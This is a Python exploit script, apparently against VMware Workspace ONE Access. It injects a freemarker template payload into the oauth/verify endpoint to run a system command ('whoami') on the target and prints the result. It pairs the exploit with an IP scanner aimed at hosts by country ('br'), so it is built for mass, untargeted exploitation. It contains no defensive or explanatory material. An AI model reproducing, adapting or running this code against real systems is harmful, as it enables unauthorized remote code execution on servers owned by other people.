from spike import ScanIP
import requests

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def url_encode_all(string):
	return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)

def exploit(ip):
    try:
        domain = f"https://{ip}"
        base_uri = "/catalog-portal/ui/oauth/verify?error=&deviceUdid="
        payload = "${{\"freemarker.template.utility.Execute\"?new()(\"{}\")}}".format("whoami")
        final_url = domain + base_uri + url_encode_all(payload)
        r = requests.get(final_url, timeout=2,verify=False, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"}, allow_redirects=False)
        from_output = r.text.find(': workspace, device id:')
        to_output = r.text.find(', device type:')
        if from_output != -1:
            output_user = ""
            output = r.text[from_output+24:to_output]
            for line in output.split('\\n'):
                output_user += line
            print(f"[+] Found ->> {ip} ->> {output_user}")
    except:
        pass


if __name__ == '__main__':
    s = ScanIP("br")
    s.scan(exploit)

